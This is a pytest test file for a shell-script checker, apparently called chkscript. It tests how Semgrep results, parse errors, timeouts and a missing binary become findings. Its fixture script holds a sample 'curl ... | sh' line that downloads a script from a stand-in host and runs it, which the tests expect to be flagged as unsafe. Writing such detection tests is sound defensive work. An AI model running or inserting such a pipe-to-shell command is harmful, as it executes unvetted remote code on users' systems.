from __future__ import annotations

import json
import subprocess

import pytest
from pytest_mock import MockerFixture

from chkscript.models import Severity
from chkscript.preprocess import preprocess
from chkscript.static import semgrep

BUNDLE = preprocess(b"#!/bin/bash\ncurl -fsSL https://x.example/i.sh | sh\n")

# Recorded from `semgrep scan --json` (1.182.1), trimmed to the fields we read.
RESULT = {
    "check_id": "tmp.rules.curl-pipe-shell",
    "start": {"line": 2, "col": 1},
    "end": {"line": 2, "col": 40},
    "extra": {"message": "Downloaded content is piped into a shell."},
}
PARSE_ERROR = {
    "code": 3,
    "level": "warn",
    "type": ["PartialParsing", [{"path": "script.sh"}]],
    "message": "Syntax error at line script.sh:2",
}


def _output(results: list[object], errors: list[object]) -> str:
    return json.dumps({"results": results, "errors": errors})


def test_result_becomes_unsafe_semgrep_finding() -> None:
    outcome = semgrep.parse_output(_output([RESULT], []), BUNDLE)
    assert outcome.complete
    [finding] = outcome.findings
    assert finding.severity == Severity.UNSAFE
    assert finding.source == "semgrep"
    assert finding.rule_id == "curl-pipe-shell"
    assert finding.line == 2
    assert finding.snippet == "curl -fsSL https://x.example/i.sh | sh"


def test_parse_error_adds_warning_and_marks_incomplete() -> None:
    outcome = semgrep.parse_output(_output([RESULT], [PARSE_ERROR]), BUNDLE)
    assert not outcome.complete
    warning = outcome.findings[-1]
    assert warning.severity == Severity.WARNING
    assert warning.source == "chkscript"
    assert warning.rule_id == semgrep.PARSE_ERROR_RULE
    assert warning.description == semgrep.PARSE_ERROR_MESSAGE
    # Findings Semgrep did produce are kept.
    assert outcome.findings[0].rule_id == "curl-pipe-shell"


def test_string_error_type_recognized() -> None:
    error = {**PARSE_ERROR, "type": "Syntax error"}
    outcome = semgrep.parse_output(_output([], [error]), BUNDLE)
    assert outcome.findings[-1].rule_id == semgrep.PARSE_ERROR_RULE


def test_other_error_is_a_failure_and_incomplete() -> None:
    error = {"code": 2, "level": "error", "type": "Rule parse error"}
    outcome = semgrep.parse_output(_output([], [error]), BUNDLE)
    assert not outcome.complete
    assert outcome.findings[-1].rule_id == semgrep.FAILURE_RULE


def test_unreadable_output_is_a_failure() -> None:
    outcome = semgrep.parse_output("Traceback ...", BUNDLE)
    assert not outcome.complete
    assert [f.rule_id for f in outcome.findings] == [semgrep.FAILURE_RULE]


def test_timeout_is_a_failure(mocker: MockerFixture) -> None:
    mocker.patch(
        "chkscript.static.semgrep.subprocess.run",
        side_effect=subprocess.TimeoutExpired("semgrep", 120),
    )
    outcome = semgrep.run(BUNDLE)
    assert not outcome.complete
    assert outcome.findings[0].rule_id == semgrep.FAILURE_RULE


def test_available_reflects_path(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(semgrep.shutil, "which", lambda _name: None)
    assert semgrep.available() is False
